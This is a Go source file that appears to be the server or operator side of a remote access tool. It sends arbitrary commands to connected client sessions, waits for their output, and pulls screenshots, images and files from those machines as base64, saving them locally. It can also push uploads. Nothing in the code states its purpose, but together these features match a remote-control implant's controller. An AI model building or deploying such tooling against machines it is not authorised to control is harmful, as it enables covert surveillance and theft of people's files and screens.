package Server

import (
	"encoding/base64"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func sendCommand(id string, cmd string) {
	mu.RLock()
	ch, exists := chs[id]
	mu.RUnlock()

	if !exists {
		log.Println("Session not found:", id)
		return
	}

	ch <- cmd
}

func receiveResponse(id string) string {
	mu.RLock()
	ch, exists := chs[id]
	mu.RUnlock()

	if !exists {
		return "Session not found"
	}

	select {
	case output := <-ch:
		return output
	default:
		return ""
	}
}

func handleCommand(id string, input string) {
	commands := parseCommand(input)
	if len(commands) == 0 {
		return
	}

	switch commands[0] {
	case "get":
		if len(commands) < 2 {
			log.Println("Invalid get command")
			return
		}
		handleGetCommand(id, commands)
	case "upload":
		if len(commands) < 3 {
			log.Println("Invalid upload command")
			return
		}
		handleUploadCommand(id, commands)
	default:
		sendCommand(id, input)
		output := waitForResponseBlocking(id)
		fmt.Println(output)
	}
}

func handleGetCommand(id string, commands []string) {
	if len(commands) < 2 {
		fmt.Println("Invalid get command")
		return
	}

	var cmdParts []string
	for _, part := range commands {
		if strings.Contains(part, " ") {
			cmdParts = append(cmdParts, fmt.Sprintf("\"%s\"", part))
		} else {
			cmdParts = append(cmdParts, part)
		}
	}
	cmd := strings.Join(cmdParts, " ")
	
	fmt.Println("Sending get command, waiting for response...")
	sendCommand(id, cmd)
	
	output := waitForResponseBlocking(id)
	
	if output == "" {
		fmt.Println("No response received or timeout")
		return
	}
	
	if strings.HasPrefix(output, "Error:") {
		fmt.Println(output)
		return
	}
	
	switch commands[1] {
	case "screenshots":
		if err := saveScreenshots(output); err != nil {
			fmt.Println("Error saving screenshots:", err)
		} else {
			fmt.Println("Screenshots saved successfully")
		}
	case "image":
		if err := saveImages(output, commands[2:]); err != nil {
			fmt.Println("Error saving images:", err)
		} else {
			fmt.Println("Images saved successfully")
		}
	case "file":
		if err := saveFiles(output, commands[2:]); err != nil {
			fmt.Println("Error saving files:", err)
		} else {
			fmt.Println("Files saved successfully")
		}
	default:
		fmt.Println(output)
	}
}

func handleUploadCommand(id string, commands []string) {
	cmd := strings.Join(commands, " ")
	sendCommand(id, cmd)
	log.Println("Upload command sent:", cmd)
}

func waitForResponse(id string) string {
	mu.RLock()
	ch, exists := respChs[id]
	mu.RUnlock()

	if !exists {
		return "Session not found"
	}

	select {
	case output := <-ch:
		return output
	default:
		return ""
	}
}

func waitForResponseBlocking(id string) string {
	mu.RLock()
	ch, exists := respChs[id]
	mu.RUnlock()

	if !exists {
		return "Session not found"
	}

	select {
	case output := <-ch:
		return output
	case <-time.After(5 * time.Minute):
		return ""
	}
}

func saveScreenshots(output string) error {
	if strings.HasPrefix(output, "Error:") {
		return fmt.Errorf(output)
	}
	
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		if line == "" {
			continue
		}
		
		parts := strings.SplitN(line, ":", 2)
		if len(parts) != 2 {
			continue
		}
		
		filename := parts[0] + ".png"
		data, err := base64.StdEncoding.DecodeString(parts[1])
		if err != nil {
			return fmt.Errorf("failed to decode %s: %w", filename, err)
		}
		
		filePath := filepath.Join(outputDir, filename)
		if err := os.WriteFile(filePath, data, 0644); err != nil {
			return fmt.Errorf("failed to save %s: %w", filename, err)
		}
		fmt.Printf("Saved: %s\n", filePath)
	}
	return nil
}

func saveImages(output string, requestedFiles []string) error {
	if strings.HasPrefix(output, "Error:") {
		return fmt.Errorf(output)
	}
	
	sections := strings.Split(output, "\n---\n")
	for i, section := range sections {
		if section == "" {
			continue
		}
		
		parts := strings.SplitN(section, ": ", 2)
		if len(parts) != 2 {
			fmt.Println(section)
			continue
		}
		
		originalName := parts[0]
		if strings.Contains(parts[1], "error:") {
			fmt.Printf("%s: %s\n", originalName, parts[1])
			continue
		}
		
		data, err := base64.StdEncoding.DecodeString(parts[1])
		if err != nil {
			return fmt.Errorf("failed to decode %s: %w", originalName, err)
		}
		
		filename := originalName
		if i < len(requestedFiles) {
			filename = filepath.Base(requestedFiles[i])
		}
		
		filePath := filepath.Join(outputDir, filename)
		if err := os.WriteFile(filePath, data, 0644); err != nil {
			return fmt.Errorf("failed to save %s: %w", filename, err)
		}
		fmt.Printf("Saved: %s\n", filePath)
	}
	return nil
}

func saveFiles(output string, requestedFiles []string) error {
	if strings.HasPrefix(output, "Error:") {
		return fmt.Errorf(output)
	}
	
	sections := strings.Split(output, "\n---\n")
	for i, section := range sections {
		if section == "" {
			continue
		}
		
		parts := strings.SplitN(section, ": ", 2)
		if len(parts) != 2 {
			fmt.Println(section)
			continue
		}
		
		originalName := parts[0]
		if strings.Contains(parts[1], "error:") {
			fmt.Printf("%s: %s\n", originalName, parts[1])
			continue
		}
		
		data, err := base64.StdEncoding.DecodeString(parts[1])
		if err != nil {
			return fmt.Errorf("failed to decode %s: %w", originalName, err)
		}
		
		filename := originalName
		if i < len(requestedFiles) {
			filename = filepath.Base(requestedFiles[i])
		}
		
		filePath := filepath.Join(outputDir, filename)
		if err := os.WriteFile(filePath, data, 0644); err != nil {
			return fmt.Errorf("failed to save %s: %w", filename, err)
		}
		fmt.Printf("Saved: %s\n", filePath)
	}
	return nil
}

func closeConnectionStuff(id string) {
	mu.Lock()
	if ch, exists := chs[id]; exists {
		close(ch)
		delete(chs, id)
	}
	if respCh, exists := respChs[id]; exists {
		close(respCh)
		delete(respChs, id)
	}
	if _, exists := dt[id]; exists {
		delete(dt, id)
	}
	if CId == id {
		CId = ""
	}
	mu.Unlock()
}
